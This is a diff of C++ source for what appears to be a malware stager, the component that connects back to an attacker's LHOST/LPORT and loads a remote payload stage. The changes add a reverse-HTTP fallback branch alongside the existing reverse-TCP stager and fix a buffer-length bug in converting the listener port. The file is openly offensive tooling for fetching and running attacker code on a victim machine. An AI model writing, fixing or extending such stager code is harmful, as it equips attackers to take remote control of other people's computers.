@@ -42,7 +42,7 @@ int wmain(int argc, wchar_t *argv[])
 {
 	PAYLOAD_SETTINGS payload_settings = {0};	// That's defined at main.h
 	unsigned char* buffer = nullptr;			// This will hold the loaded stage
-	unsigned char* TempBuffer = nullptr;		// This will have stuff set-up "like the socket" set-up, then the stage will be copied here.
+	unsigned char* TempBuffer = nullptr;		// This will have stuff set-up "like the socket", then the stage will be copied over.
 	DWORD bufferSize = 0;						// buffer length
 	DWORD StageSize = 0;						// if we're using encryption ... stage size = (bufferSize - 16) 
 	DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
@@ -177,6 +177,10 @@ int wmain(int argc, wchar_t *argv[])
 		{
 			StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
 		} 
+		else 
+		{
+			StagerReverseHTTP(payload_settings.LHOST,payload_settings.LPORT,payload_settings.TRANSPORT);
+		}
 	}
 		//--------- End of "working as a stager" ------------//
 	
@@ -342,7 +346,7 @@ int wmain(int argc, wchar_t *argv[])
 			char tempChar2[512] = {0}; //This is used for converting from wchar_t to char... 
 
 			wcstombs_s(NULL,tempChar1,payload_settings.LHOST, wcslen(payload_settings.LHOST)); //convert the LHOST to char
-			wcstombs_s(NULL,tempChar2,payload_settings.LPORT, wcslen(payload_settings.LHOST)); //convert the LPORT to char
+			wcstombs_s(NULL,tempChar2,payload_settings.LPORT, wcslen(payload_settings.LPORT)); //convert the LPORT to char
 
 			//wide-char conversion happiness ends here... building the url...
 			strcat_s(url,tempChar1);	// "http(s)://LHOST"
